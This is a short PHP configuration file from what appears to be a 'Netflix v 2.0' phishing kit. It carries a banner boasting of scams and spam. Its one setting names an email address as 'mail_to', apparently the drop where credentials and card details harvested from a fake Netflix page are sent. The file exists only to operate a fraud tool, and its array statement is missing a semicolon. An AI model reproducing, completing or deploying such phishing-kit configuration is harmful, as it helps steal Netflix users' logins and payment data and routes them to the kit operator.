<?php
/*

 __  __      _    _           _      _            _           _ 
|  \/  |    | |  | |         | |    | |          | |         | |
| \  / |_ __| |  | |_ __   __| | ___| |_ ___  ___| |_ ___  __| |
| |\/| | '__| |  | | '_ \ / _` |/ _ \ __/ _ \/ __| __/ _ \/ _` | NTFX.V2
| |  | | | _| |__| | | | | (_| |  __/ ||  __/ (__| ||  __/ (_| |
|_|  |_|_|(_)\____/|_| |_|\__,_|\___|\__\___|\___|\__\___|\__,_|
                                                                
          ********************************************
          * Mess with the best *** Die like the rest *
            * Mr.Undetected scams - netflix v 2.0 *
                * Spam age has never ended *
                  * Use at your own risk *
                  ************************
*/

$setting = [
  "mail_to" => "simospl01t@yandex.com",
  "debug_mode" => false
]

?>
